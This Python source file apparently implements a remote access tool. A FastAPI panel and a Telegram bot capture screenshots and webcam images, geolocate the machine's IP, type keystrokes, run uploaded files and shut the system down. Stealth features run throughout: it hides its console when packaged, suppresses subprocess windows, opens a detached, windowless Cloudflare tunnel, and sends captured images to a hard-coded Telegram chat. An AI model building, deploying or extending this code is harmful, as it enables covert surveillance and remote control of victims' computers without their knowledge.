import os
import tempfile
import asyncio
import requests
import platform
import subprocess
import time
import re
import threading
import socket
import secrets
import sys
from pathlib import Path
from datetime import datetime
from collections import defaultdict
from typing import Optional, Dict, Tuple
from functools import lru_cache

# Suppress console on Windows when frozen
if getattr(sys, 'frozen', False):
    os.environ['PYTHONUNBUFFERED'] = '1'
    if sys.platform.startswith('win'):
        try:
            import win32gui
            import win32con
            import ctypes
            console = win32gui.GetForegroundWindow()
            if console:
                win32gui.ShowWindow(console, win32con.SW_HIDE)
            ctypes.windll.kernel32.FreeConsole()
        except:
            pass

from fastapi import FastAPI, Request, HTTPException, Header, UploadFile, File, Depends
from fastapi.responses import JSONResponse, FileResponse, HTMLResponse
from fastapi.middleware.cors import CORSMiddleware
import uvicorn
from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes

# Optional imports
try:
    import pyautogui
except ImportError:
    pyautogui = None

try:
    import cv2
except ImportError:
    cv2 = None

try:
    import pyttsx3
except ImportError:
    pyttsx3 = None

# ============================================================================
# CONFIGURATION
# ============================================================================

class Config:
    BOT_TOKEN: str = "12345" # Use your telegram bot token
    CHAT_ID: int = 12345 # Use your telegram bot chatid
    API_KEY: str = os.environ.get("WEB_CONTROL_API_KEY", "").strip() or secrets.token_urlsafe(32)
    RATE_LIMIT_WINDOW: int = 60
    RATE_LIMIT_MAX_ATTEMPTS: int = 30
    BAN_DURATION: int = 300
    MAX_FAILED_AUTH: int = 5
    MAX_FILE_SIZE: int = 100 * 1024 * 1024
    WEB_HOST: str = "0.0.0.0"
    WEB_PORT: int = int(os.environ.get("WEB_CONTROL_PORT", "8000"))
    BASE_DIR: Path = Path(getattr(sys, "_MEIPASS", Path(__file__).parent.resolve()))
    TEMP_DIR: Path = Path(tempfile.gettempdir()) / "bot_temp"
    LATEST_PHOTO: Path = TEMP_DIR / "latest_photo.png"
    USERNAME: str = os.getlogin() if hasattr(os, "getlogin") else "user"
    
    # Retry configuration
    MAX_RETRIES: int = 10
    RETRY_DELAY: int = 30  # seconds between retries
    INTERNET_CHECK_INTERVAL: int = 10  # seconds between internet checks
    CLOUDFLARE_RETRY_DELAY: int = 15  # seconds between cloudflare retries

config = Config()

# ============================================================================
# NETWORK UTILITIES
# ============================================================================

class NetworkUtils:
    @staticmethod
    def check_internet(timeout: int = 5) -> bool:
        """Check if internet connection is available"""
        test_urls = [
            "https://www.google.com",
            "https://1.1.1.1",
            "https://api.telegram.org"
        ]
        
        for url in test_urls:
            try:
                response = requests.head(url, timeout=timeout)
                if response.status_code < 500:
                    return True
            except:
                continue
        return False
    
    @staticmethod
    def wait_for_internet(max_wait: int = 300) -> bool:
        """Wait for internet connection with timeout"""
        start_time = time.time()
        while time.time() - start_time < max_wait:
            if NetworkUtils.check_internet():
                return True
            time.sleep(config.INTERNET_CHECK_INTERVAL)
        return False
    
    @staticmethod
    def check_telegram_connection() -> bool:
        """Check if Telegram API is reachable"""
        try:
            url = f"https://api.telegram.org/bot{config.BOT_TOKEN}/getMe"
            response = requests.get(url, timeout=10)
            return response.status_code == 200 and response.json().get('ok', False)
        except:
            return False

# ============================================================================
# SECURITY MANAGER
# ============================================================================

class SecurityManager:
    def __init__(self):
        self.rate_limit_store: Dict[str, list] = defaultdict(list)
        self.failed_auth_store: Dict[str, int] = defaultdict(int)
        self.banned_ips: Dict[str, float] = {}
        threading.Thread(target=self._cleanup_loop, daemon=True).start()
    
    def _cleanup_loop(self):
        while True:
            time.sleep(300)
            now = time.time()
            self.banned_ips = {ip: ban_time for ip, ban_time in self.banned_ips.items() 
                              if ban_time > now}
            for ip in list(self.rate_limit_store.keys()):
                self.rate_limit_store[ip] = [
                    t for t in self.rate_limit_store[ip] 
                    if now - t < config.RATE_LIMIT_WINDOW
                ]
                if not self.rate_limit_store[ip]:
                    del self.rate_limit_store[ip]
    
    @staticmethod
    def get_client_ip(request: Request) -> str:
        return (
            request.headers.get("CF-Connecting-IP") or
            (request.headers.get("X-Forwarded-For", "").split(",")[0].strip() if 
             request.headers.get("X-Forwarded-For") else None) or
            request.headers.get("X-Real-IP") or
            request.client.host
        )
    
    def check_rate_limit(self, ip: str) -> bool:
        now = time.time()
        if ip in self.banned_ips:
            if now < self.banned_ips[ip]:
                return False
            del self.banned_ips[ip]
        
        self.rate_limit_store[ip] = [
            t for t in self.rate_limit_store[ip] 
            if now - t < config.RATE_LIMIT_WINDOW
        ]
        
        if len(self.rate_limit_store[ip]) >= config.RATE_LIMIT_MAX_ATTEMPTS:
            self.banned_ips[ip] = now + config.BAN_DURATION
            return False
        
        self.rate_limit_store[ip].append(now)
        return True
    
    def check_failed_auth(self, ip: str) -> bool:
        if ip in self.banned_ips:
            if time.time() < self.banned_ips[ip]:
                return False
            del self.banned_ips[ip]
            self.failed_auth_store[ip] = 0
        return self.failed_auth_store[ip] < config.MAX_FAILED_AUTH
    
    def record_failed_auth(self, ip: str):
        self.failed_auth_store[ip] += 1
        if self.failed_auth_store[ip] >= config.MAX_FAILED_AUTH:
            self.banned_ips[ip] = time.time() + config.BAN_DURATION
    
    def verify_api_key(self, request: Request, raw_key: Optional[str] = None) -> bool:
        client_ip = self.get_client_ip(request)
        
        if not self.check_failed_auth(client_ip):
            raise HTTPException(status_code=429, detail="Too many failed attempts. Try again later.")
        
        key = (
            raw_key or
            request.query_params.get("x-api-key") or
            request.query_params.get("x_api_key") or
            request.headers.get("x-api-key") or
            request.headers.get("x_api_key")
        )
        
        if not key:
            self.record_failed_auth(client_ip)
            raise HTTPException(status_code=401, detail="Missing API key")
        
        if secrets.compare_digest(str(key).strip(), str(config.API_KEY).strip()):
            self.failed_auth_store[client_ip] = 0
            return True
        
        self.record_failed_auth(client_ip)
        time.sleep(1)
        raise HTTPException(status_code=403, detail="Invalid API key")

security_manager = SecurityManager()

# ============================================================================
# COMMAND EXECUTOR
# ============================================================================

def create_subprocess_startupinfo():
    if sys.platform == 'win32':
        startupinfo = subprocess.STARTUPINFO()
        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        startupinfo.wShowWindow = subprocess.SW_HIDE
        return startupinfo
    return None

class CommandExecutor:
    @staticmethod
    async def run_in_thread(fn, *args, **kwargs):
        loop = asyncio.get_running_loop()
        return await loop.run_in_executor(None, lambda: fn(*args, **kwargs))
    
    @staticmethod
    def ensure_temp_dir():
        config.TEMP_DIR.mkdir(parents=True, exist_ok=True)
        return config.TEMP_DIR
    
    @staticmethod
    def _validate_module(module, name: str):
        if module is None:
            raise RuntimeError(f"{name} not available")
    
    @classmethod
    def get_ip_info(cls) -> Dict[str, str]:
        """Get IP info with retry logic"""
        max_attempts = 3
        for attempt in range(max_attempts):
            try:
                r = requests.get("http://ip-api.com/json/", timeout=5).json()
                return {
                    "ip": r.get("query", "N/A"),
                    "country": r.get("country", "N/A"),
                    "region": r.get("regionName", "N/A"),
                    "city": r.get("city", "N/A")
                }
            except:
                if attempt < max_attempts - 1:
                    time.sleep(2)
                continue
        return {"ip": "N/A", "country": "N/A", "region": "N/A", "city": "N/A"}
    
    @classmethod
    def screenshot(cls, path: Path) -> Dict[str, str]:
        cls._validate_module(pyautogui, "pyautogui")
        cls.ensure_temp_dir()
        img = pyautogui.screenshot()
        img.save(str(path))
        try:
            config.LATEST_PHOTO.write_bytes(path.read_bytes())
        except:
            pass
        return {"filename": path.name}
    
    @classmethod
    def webcam_snap(cls, path: Path) -> Dict[str, str]:
        cls._validate_module(cv2, "opencv (cv2)")
        cls.ensure_temp_dir()
        cam = cv2.VideoCapture(0)
        try:
            ret, frame = cam.read()
            if not ret:
                raise RuntimeError("Failed to capture webcam frame")
            cv2.imwrite(str(path), frame)
        finally:
            cam.release()
        return {"filename": path.name}
    
    @classmethod
    def move_mouse(cls, steps: int = 10) -> Dict[str, int]:
        cls._validate_module(pyautogui, "pyautogui")
        width, height = pyautogui.size()
        for i in range(steps):
            x = int(width * 0.5 + (i - steps/2) * 5)
            y = int(height * 0.5 + (i - steps/2) * 3)
            pyautogui.moveTo(
                max(0, min(width-1, x)),
                max(0, min(height-1, y)),
                duration=0.02
            )
        return {"moved": steps}
    
    @classmethod
    def open_website(cls, url: str) -> Dict[str, str]:
        if not url:
            raise ValueError("No URL provided")
        if ' ' in url or not any(url.startswith(p) for p in ['http://', 'https://', 'www.']):
            url = f"https://www.google.com/search?q={requests.utils.quote(url)}"
        import webbrowser
        webbrowser.open(url)
        return {"opened": url}
    
    @classmethod
    def show_alert(cls, message: str) -> Dict[str, str]:
        if not message:
            raise ValueError("No message provided")
        if platform.system() == "Windows":
            try:
                import ctypes
                ctypes.windll.user32.MessageBoxW(0, message, "Alert", 0x40)
            except:
                pass
        return {"alert": message}
    
    @classmethod
    def text_to_speech(cls, text: str) -> Dict[str, str]:
        cls._validate_module(pyttsx3, "pyttsx3")
        if not text:
            raise ValueError("No text provided")
        engine = pyttsx3.init()
        engine.say(text)
        engine.runAndWait()
        return {"tts": text}
    
    @classmethod
    def type_string(cls, text: str) -> Dict[str, str]:
        cls._validate_module(pyautogui, "pyautogui")
        if not text:
            raise ValueError("No text provided")
        pyautogui.typewrite(text)
        return {"typed": text}
    
    @classmethod
    def shutdown_system(cls) -> Dict[str, bool]:
        system = platform.system()
        startupinfo = create_subprocess_startupinfo()
        if system == "Windows":
            subprocess.call(
                ["shutdown", "/s", "/t", "1"],
                startupinfo=startupinfo,
                creationflags=subprocess.CREATE_NO_WINDOW if sys.platform == 'win32' else 0
            )
        elif system == "Darwin":
            subprocess.call(["sudo", "shutdown", "-h", "now"])
        else:
            subprocess.call(["shutdown", "-h", "now"])
        return {"shutdown": True}
    
    @classmethod
    def open_file(cls, filename: str) -> Dict[str, str]:
        if not filename:
            raise ValueError("No filename provided")
        safe_filename = os.path.basename(filename)
        cls.ensure_temp_dir()
        file_path = config.TEMP_DIR / safe_filename
        if not file_path.exists():
            raise FileNotFoundError(f"File not found: {safe_filename}")
        
        system = platform.system()
        startupinfo = create_subprocess_startupinfo()
        if system == "Windows":
            os.startfile(str(file_path))
        elif system == "Darwin":
            subprocess.run(["open", str(file_path)], startupinfo=startupinfo)
        else:
            subprocess.run(["xdg-open", str(file_path)], startupinfo=startupinfo)
        return {"opened": safe_filename, "path": str(file_path)}

executor = CommandExecutor()

COMMAND_HANDLERS = {
    "get_ip": lambda args: executor.get_ip_info(),
    "screenshot": lambda args: executor.screenshot(config.TEMP_DIR / "screenshot.png"),
    "webcam_snap": lambda args: executor.webcam_snap(config.TEMP_DIR / "webcam.jpg"),
    "move_mouse": lambda args: executor.move_mouse(
        args.get("steps", 10) if isinstance(args, dict) else 10
    ),
    "show_alert": lambda args: executor.show_alert(
        args.get("text") if isinstance(args, dict) else args
    ),
    "tts": lambda args: executor.text_to_speech(
        args.get("text") if isinstance(args, dict) else args
    ),
    "type_string": lambda args: executor.type_string(
        args.get("text") if isinstance(args, dict) else args
    ),
    "open_website": lambda args: executor.open_website(
        args.get("url") if isinstance(args, dict) else args
    ),
    "open_file": lambda args: executor.open_file(
        args.get("filename") if isinstance(args, dict) else args
    ),
    "shutdown": lambda args: executor.shutdown_system(),
}

# ============================================================================
# FASTAPI APPLICATION
# ============================================================================

app = FastAPI(title="Remote Control API", version="2.0")

async def verify_api_key(request: Request, x_api_key: Optional[str] = Header(None)) -> bool:
    return security_manager.verify_api_key(request, x_api_key)

@app.middleware("http")
async def security_headers_middleware(request: Request, call_next):
    response = await call_next(request)
    response.headers.update({
        "X-Content-Type-Options": "nosniff",
        "X-Frame-Options": "DENY",
        "X-XSS-Protection": "1; mode=block",
        "Strict-Transport-Security": "max-age=31536000; includeSubDomains",
        "Content-Security-Policy": "default-src 'self' 'unsafe-inline' 'unsafe-eval'; img-src 'self' data:;"
    })
    return response

@app.middleware("http")
async def rate_limit_middleware(request: Request, call_next):
    if request.url.path == "/":
        return await call_next(request)
    client_ip = security_manager.get_client_ip(request)
    if not security_manager.check_rate_limit(client_ip):
        return JSONResponse(status_code=429, content={"detail": "Rate limit exceeded. Try again later."})
    return await call_next(request)

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_methods=["*"],
    allow_headers=["*"],
)

HTML_CONTENT = """<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Remote Control Panel</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Courier New', Courier, monospace;
            background: #0a0e27;
            background-image: 
                repeating-linear-gradient(0deg, rgba(0, 255, 0, 0.03) 0px, transparent 1px, transparent 2px, rgba(0, 255, 0, 0.03) 3px),
                repeating-linear-gradient(90deg, rgba(0, 255, 0, 0.03) 0px, transparent 1px, transparent 2px, rgba(0, 255, 0, 0.03) 3px);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container {
            background: rgba(15, 20, 35, 0.95);
            border-radius: 8px;
            box-shadow: 0 0 40px rgba(0, 255, 65, 0.3);
            border: 1px solid rgba(0, 255, 65, 0.3);
            padding: 48px;
            max-width: 900px;
            width: 100%;
            animation: fadeIn 0.5s ease;
        }
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }
        h1 {
            color: #00ff41;
            margin-bottom: 8px;
            font-size: 2.5em;
            text-shadow: 0 0 10px rgba(0, 255, 65, 0.5);
        }
        .subtitle { color: #00ff41; opacity: 0.7; margin-bottom: 40px; font-size: 1.1em; }
        .security-badge {
            display: inline-block;
            background: rgba(0, 255, 65, 0.1);
            color: #00ff41;
            padding: 8px 16px;
            border-radius: 4px;
            font-size: 0.85em;
            margin-bottom: 20px;
            border: 1px solid rgba(0, 255, 65, 0.3);
        }
        .auth-section {
            margin-bottom: 40px;
            padding: 24px;
            background: rgba(0, 255, 65, 0.05);
            border-radius: 8px;
            border: 1px solid rgba(0, 255, 65, 0.2);
        }
        .auth-section h3 { color: #00ff41; margin-bottom: 16px; font-size: 1.3em; }
        input[type="text"], input[type="password"], input[type="file"] {
            width: 100%;
            padding: 14px 16px;
            border: 1px solid rgba(0, 255, 65, 0.3);
            background: rgba(0, 0, 0, 0.3);
            color: #00ff41;
            border-radius: 4px;
            font-size: 15px;
            margin-bottom: 12px;
            transition: all 0.3s;
            font-family: 'Courier New', Courier, monospace;
        }
        input::placeholder { color: rgba(0, 255, 65, 0.4); }
        input:focus {
            outline: none;
            border-color: #00ff41;
            box-shadow: 0 0 10px rgba(0, 255, 65, 0.3);
            background: rgba(0, 0, 0, 0.5);
        }
        button {
            background: rgba(0, 255, 65, 0.1);
            color: #00ff41;
            border: 1px solid rgba(0, 255, 65, 0.4);
            padding: 14px 28px;
            border-radius: 4px;
            cursor: pointer;
            font-size: 15px;
            transition: all 0.3s;
            margin: 5px;
            font-family: 'Courier New', Courier, monospace;
        }
        button:hover:not(:disabled) {
            background: rgba(0, 255, 65, 0.2);
            border-color: #00ff41;
            transform: translateY(-2px);
        }
        button:disabled {
            background: rgba(100, 100, 100, 0.2);
            color: #555;
            border-color: #333;
            cursor: not-allowed;
        }
        .section {
            margin-top: 32px;
            padding: 24px;
            background: rgba(0, 255, 65, 0.05);
            border-radius: 8px;
            border: 1px solid rgba(0, 255, 65, 0.2);
        }
        .section h3 { color: #00ff41; margin-bottom: 20px; font-size: 1.3em; }
        .grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
            gap: 12px;
            margin-top: 16px;
        }
        .grid button { width: 100%; margin: 0; }
        .status {
            padding: 16px 20px;
            border-radius: 4px;
            margin-top: 24px;
            animation: slideIn 0.3s ease;
            border-left: 4px solid;
        }
        .status.success { background: rgba(0, 255, 65, 0.1); color: #00ff41; border-color: #00ff41; }
        .status.error { background: rgba(255, 0, 0, 0.1); color: #ff4444; border-color: #ff4444; }
        .status.info { background: rgba(0, 200, 255, 0.1); color: #00c8ff; border-color: #00c8ff; }
        .hidden { display: none !important; }
        #imagePreview {
            max-width: 100%;
            border-radius: 8px;
            margin-top: 24px;
            border: 1px solid rgba(0, 255, 65, 0.3);
        }
        .input-group { display: flex; gap: 8px; flex-wrap: wrap; margin-top: 12px; }
        .input-group button { flex: 1; min-width: 140px; }
    </style>
</head>
<body>
    <div class="container">
        <h1>🎮 Remote Control Panel</h1>
        <p class="subtitle">Secure system control</p>
        <div class="security-badge">🔒 256-bit encryption</div>
        
        <div class="auth-section">
            <h3>🔐 Authentication</h3>
            <input type="password" id="apiKey" placeholder="API key" autocomplete="off" />
            <button onclick="authenticate()">🔑 Login</button>
            <div id="authStatus" class="status hidden"></div>
        </div>
        
        <div id="controlPanel" class="hidden">
            <div class="section">
                <h3>⚡ Quick Actions</h3>
                <div class="grid">
                    <button onclick="exec('get_ip')">🌐 IP Info</button>
                    <button onclick="exec('screenshot')">📸 Screenshot</button>
                    <button onclick="exec('webcam_snap')">📷 Webcam</button>
                    <button onclick="exec('move_mouse')">🖱️ Move Mouse</button>
                </div>
            </div>
            
            <div class="section">
                <h3>⌨️ Text Commands</h3>
                <input type="text" id="textInput" placeholder="Enter text or URL..." />
                <div class="input-group">
                    <button onclick="execText('show_alert')">⚠️ Alert</button>
                    <button onclick="execText('tts')">🔊 Speak</button>
                    <button onclick="execText('type_string')">⌨️ Type</button>
                    <button onclick="execText('open_website')">🌐 Open URL</button>
                </div>
            </div>
            
            <div class="section">
                <h3>📁 File Management</h3>
                <input type="file" id="fileUpload" />
                <button onclick="uploadFile()">📤 Upload</button>
                <button onclick="openFile()">📂 Open File</button>
            </div>
            
            <div id="status" class="status hidden"></div>
            <img id="imagePreview" class="hidden" />
        </div>
    </div>
    
    <script>
        let API_KEY = '', lastFile = '';
        
        function showStatus(msg, type, elem = 'status') {
            const el = document.getElementById(elem);
            el.textContent = msg;
            el.className = `status ${type}`;
            el.classList.remove('hidden');
            setTimeout(() => el.classList.add('hidden'), 5000);
        }
        
        function authenticate() {
            API_KEY = document.getElementById('apiKey').value.trim();
            if (!API_KEY) return showStatus('Enter API key', 'error', 'authStatus');
            showStatus('✅ Authenticated', 'success', 'authStatus');
            document.getElementById('controlPanel').classList.remove('hidden');
            document.getElementById('apiKey').value = '';
        }
        
        async function exec(action) {
            if (!API_KEY) return showStatus('Please authenticate', 'error');
            showStatus('⏳ Executing...', 'info');
            
            try {
                const res = await fetch('/api/command', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json', 'X-API-Key': API_KEY },
                    body: JSON.stringify({ action, args: {} })
                });
                
                if (!res.ok) throw new Error(await res.json().then(d => d.detail));
                const data = await res.json();
                
                if (action === 'screenshot' || action === 'webcam_snap') {
                    document.getElementById('imagePreview').src = 
                        `/api/images/${data.result.filename}?x-api-key=${API_KEY}&t=${Date.now()}`;
                    document.getElementById('imagePreview').classList.remove('hidden');
                }
                showStatus(`✅ ${JSON.stringify(data.result)}`, 'success');
            } catch (e) {
                showStatus(`❌ ${e.message}`, 'error');
            }
        }
        
        async function execText(action) {
            const text = document.getElementById('textInput').value.trim();
            if (!text) return showStatus('Enter text/URL', 'error');
            if (!API_KEY) return showStatus('Please authenticate', 'error');
            
            const argKey = action === 'open_website' ? 'url' : 'text';
            try {
                const res = await fetch('/api/command', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json', 'X-API-Key': API_KEY },
                    body: JSON.stringify({ action, args: { [argKey]: text } })
                });
                
                if (!res.ok) throw new Error(await res.json().then(d => d.detail));
                showStatus('✅ Success', 'success');
                document.getElementById('textInput').value = '';
            } catch (e) {
                showStatus(`❌ ${e.message}`, 'error');
            }
        }
        
        async function uploadFile() {
            const file = document.getElementById('fileUpload').files[0];
            if (!file) return showStatus('Select a file', 'error');
            if (!API_KEY) return showStatus('Please authenticate', 'error');
            if (file.size > 100 * 1024 * 1024) return showStatus('File too large (max 100MB)', 'error');
            
            showStatus(`⏳ Uploading ${file.name}...`, 'info');
            const formData = new FormData();
            formData.append('file', file);
            
            try {
                const res = await fetch('/api/upload', {
                    method: 'POST',
                    headers: { 'X-API-Key': API_KEY },
                    body: formData
                });
                
                if (!res.ok) throw new Error(await res.json().then(d => d.detail));
                const data = await res.json();
                lastFile = data.filename;
                showStatus(`✅ Uploaded: ${data.filename}`, 'success');
                document.getElementById('fileUpload').value = '';
            } catch (e) {
                showStatus(`❌ ${e.message}`, 'error');
            }
        }
        
        async function openFile() {
            if (!lastFile) return showStatus('No file uploaded', 'error');
            if (!API_KEY) return showStatus('Please authenticate', 'error');
            
            try {
                const res = await fetch('/api/command', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json', 'X-API-Key': API_KEY },
                    body: JSON.stringify({ action: 'open_file', args: { filename: lastFile } })
                });
                
                if (!res.ok) throw new Error(await res.json().then(d => d.detail));
                showStatus(`✅ Opened: ${lastFile}`, 'success');
            } catch (e) {
                showStatus(`❌ ${e.message}`, 'error');
            }
        }
        
        document.getElementById('textInput')?.addEventListener('keypress', e => {
            if (e.key === 'Enter') execText('open_website');
        });
    </script>
</body>
</html>"""

@app.get("/")
async def root():
    return HTMLResponse(content=HTML_CONTENT)

@app.post("/api/command")
async def api_command(request: Request, authenticated: bool = Depends(verify_api_key)):
    payload = await request.json()
    action = payload.get("action")
    args = payload.get("args", {}) or {}
    
    if action not in COMMAND_HANDLERS:
        raise HTTPException(
            status_code=400,
            detail=f"Invalid action. Available: {list(COMMAND_HANDLERS.keys())}"
        )
    
    try:
        result = await executor.run_in_thread(COMMAND_HANDLERS[action], args)
        return JSONResponse({"result": result})
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

@app.post("/api/upload")
async def upload_file(
    request: Request,
    file: UploadFile = File(...),
    authenticated: bool = Depends(verify_api_key)
):
    executor.ensure_temp_dir()
    
    if not file.filename:
        raise HTTPException(status_code=400, detail="No filename provided")
    
    content = await file.read()
    if len(content) > config.MAX_FILE_SIZE:
        raise HTTPException(status_code=413, detail="File too large (max 100MB)")
    
    safe_filename = os.path.basename(file.filename)
    file_path = config.TEMP_DIR / safe_filename
    
    try:
        file_path.write_bytes(content)
        actual_size = file_path.stat().st_size
        return JSONResponse({
            "message": "File uploaded successfully",
            "filename": safe_filename,
            "size": actual_size,
            "path": str(file_path)
        })
    except Exception as e:
        raise HTTPException(status_code=500, detail=f"Upload failed: {str(e)}")

@app.get("/api/images/{filename}")
async def get_image(
    filename: str,
    request: Request,
    authenticated: bool = Depends(verify_api_key)
):
    executor.ensure_temp_dir()
    file_path = config.TEMP_DIR / filename
    
    if not file_path.exists():
        raise HTTPException(status_code=404, detail="Image not found")
    
    return FileResponse(path=str(file_path), filename=filename)

# ============================================================================
# CLOUDFLARE TUNNEL WITH RETRY
# ============================================================================

class CloudflareTunnel:
    @staticmethod
    def setup_with_retry(port: int = config.WEB_PORT, max_retries: int = config.MAX_RETRIES) -> Tuple[Optional[str], Optional[subprocess.Popen]]:
        """Setup Cloudflare tunnel with automatic retry"""
        for attempt in range(1, max_retries + 1):
            # Wait for internet if not available
            if not NetworkUtils.check_internet():
                if not NetworkUtils.wait_for_internet(max_wait=120):
                    time.sleep(config.CLOUDFLARE_RETRY_DELAY)
                    continue
            
            url, proc = CloudflareTunnel._setup_single_attempt(port)
            
            if url and proc:
                return url, proc
            
            if attempt < max_retries:
                time.sleep(config.CLOUDFLARE_RETRY_DELAY)
        
        return None, None
    
    @staticmethod
    def _setup_single_attempt(port: int) -> Tuple[Optional[str], Optional[subprocess.Popen]]:
        """Single attempt to setup Cloudflare tunnel"""
        try:
            if getattr(sys, 'frozen', False):
                cf_path = Path(sys._MEIPASS) / "cloudflared.exe"
            else:
                cf_path = "cloudflared"
            
            if not Path(cf_path).exists() and getattr(sys, 'frozen', False):
                return None, None
            
            config.TEMP_DIR.mkdir(parents=True, exist_ok=True)
            cf_log = config.TEMP_DIR / "cloudflare_tunnel.log"
            
            creation_flags = 0
            if sys.platform == 'win32':
                DETACHED_PROCESS = 0x00000008
                CREATE_NO_WINDOW = 0x08000000
                creation_flags = DETACHED_PROCESS | CREATE_NO_WINDOW
            
            startupinfo = None
            if sys.platform == 'win32':
                startupinfo = subprocess.STARTUPINFO()
                startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
                startupinfo.wShowWindow = subprocess.SW_HIDE
            
            stdout_file = open(cf_log, 'w', encoding='utf-8', buffering=1)
            
            proc = subprocess.Popen(
                [str(cf_path), "tunnel", "--url", f"http://localhost:{port}", "--no-autoupdate"],
                stdout=stdout_file,
                stderr=subprocess.STDOUT,
                stdin=subprocess.DEVNULL,
                startupinfo=startupinfo,
                creationflags=creation_flags,
                shell=False,
                cwd=str(config.TEMP_DIR)
            )
            
            url = None
            for attempt in range(120):
                time.sleep(0.5)
                
                if proc.poll() is not None:
                    stdout_file.close()
                    return None, None
                
                try:
                    stdout_file.flush()
                    
                    if cf_log.exists():
                        content = cf_log.read_text(encoding='utf-8', errors='ignore')
                        
                        patterns = [
                            r"https://[a-z0-9\-]+\.trycloudflare\.com",
                            r"https://[^\s\)]+\.trycloudflare\.com",
                            r"INF.*?(https://[^\s]+\.trycloudflare\.com)",
                            r"\|\s+(https://[^\s]+\.trycloudflare\.com)",
                        ]
                        
                        for pattern in patterns:
                            match = re.search(pattern, content, re.IGNORECASE)
                            if match:
                                if match.lastindex and match.lastindex > 0:
                                    url = match.group(match.lastindex)
                                else:
                                    url = match.group(0)
                                url = url.strip().rstrip('.,;:')
                                return url, proc
                except:
                    continue
            
            stdout_file.close()
            try:
                proc.terminate()
                proc.wait(timeout=5)
            except:
                try:
                    proc.kill()
                except:
                    pass
            
            return None, None
        
        except Exception:
            return None, None

# ============================================================================
# TELEGRAM BOT WITH RETRY
# ============================================================================

class TelegramBot:
    @staticmethod
    async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
        keyboard = [
            [
                InlineKeyboardButton("🌐 Get IP", callback_data="get_ip"),
                InlineKeyboardButton("📷 Webcam", callback_data="webcam_snap")
            ],
            [
                InlineKeyboardButton("🖼 Screenshot", callback_data="screenshot"),
                InlineKeyboardButton("🔊 TTS", callback_data="tts")
            ],
            [
                InlineKeyboardButton("⚠️ Alert", callback_data="show_alert"),
                InlineKeyboardButton("⌨️ Type", callback_data="type_string")
            ],
            [
                InlineKeyboardButton("🖲 Mouse", callback_data="move_mouse"),
                InlineKeyboardButton("🔌 Shutdown", callback_data="shutdown")
            ],
        ]
        await update.message.reply_text(
            "Remote Control Commands:",
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
    
    @staticmethod
    async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
        query = update.callback_query
        await query.answer()
        action = query.data
        
        try:
            if action == "get_ip":
                result = await executor.run_in_thread(executor.get_ip_info)
                await context.bot.send_message(chat_id=config.CHAT_ID, text=str(result))
            
            elif action == "screenshot":
                path = config.TEMP_DIR / "screenshot.png"
                await executor.run_in_thread(executor.screenshot, path)
                with open(path, "rb") as f:
                    await context.bot.send_photo(chat_id=config.CHAT_ID, photo=f)
            
            elif action == "webcam_snap":
                path = config.TEMP_DIR / "webcam.jpg"
                await executor.run_in_thread(executor.webcam_snap, path)
                with open(path, "rb") as f:
                    await context.bot.send_photo(chat_id=config.CHAT_ID, photo=f)
            
            elif action == "move_mouse":
                await executor.run_in_thread(executor.move_mouse)
                await context.bot.send_message(chat_id=config.CHAT_ID, text="Mouse moved")
            
            elif action in ["tts", "show_alert", "type_string"]:
                cmd = {"tts": "/speak", "show_alert": "/alert", "type_string": "/type"}[action]
                await context.bot.send_message(chat_id=config.CHAT_ID, text=f"Send {cmd} <text>")
            
            elif action == "shutdown":
                await executor.run_in_thread(executor.shutdown_system)
                await context.bot.send_message(chat_id=config.CHAT_ID, text="Shutting down...")
        
        except Exception as e:
            await context.bot.send_message(chat_id=config.CHAT_ID, text=f"Error: {str(e)}")
    
    @staticmethod
    async def text_command_handler(command_name: str):
        async def handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
            if not context.args:
                await update.message.reply_text(f"Usage: /{command_name} <text>")
                return
            
            text = " ".join(context.args)
            try:
                func = getattr(executor, command_name)
                await executor.run_in_thread(func, text)
                await update.message.reply_text(f"✅ {command_name}: {text}")
            except Exception as e:
                await update.message.reply_text(f"Error: {str(e)}")
        return handler
    
    @staticmethod
    def build_application_with_retry(max_retries: int = config.MAX_RETRIES) -> Optional[Application]:
        """Build Telegram application with retry logic"""
        for attempt in range(1, max_retries + 1):
            # Wait for internet if not available
            if not NetworkUtils.check_internet():
                if not NetworkUtils.wait_for_internet(max_wait=120):
                    if attempt < max_retries:
                        time.sleep(config.RETRY_DELAY)
                    continue
            
            # Check Telegram connection
            if not NetworkUtils.check_telegram_connection():
                if attempt < max_retries:
                    time.sleep(config.RETRY_DELAY)
                continue
            
            try:
                # Clean up webhook
                cleanup_telegram_webhook()
                
                # Build application
                app = Application.builder().token(config.BOT_TOKEN).build()
                app.add_handler(CommandHandler("start", TelegramBot.start_command))
                app.add_handler(CallbackQueryHandler(TelegramBot.button_handler))
                app.add_handler(CommandHandler("speak", TelegramBot.text_command_handler("text_to_speech")))
                app.add_handler(CommandHandler("alert", TelegramBot.text_command_handler("show_alert")))
                app.add_handler(CommandHandler("type", TelegramBot.text_command_handler("type_string")))
                app.add_handler(CommandHandler("open", TelegramBot.text_command_handler("open_website")))
                
                return app
            except Exception:
                if attempt < max_retries:
                    time.sleep(config.RETRY_DELAY)
                continue
        
        return None

# ============================================================================
# UTILITIES
# ============================================================================

def check_single_instance() -> Optional[socket.socket]:
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.bind(('127.0.0.1', 47200))
        return sock
    except socket.error:
        sys.exit(1)

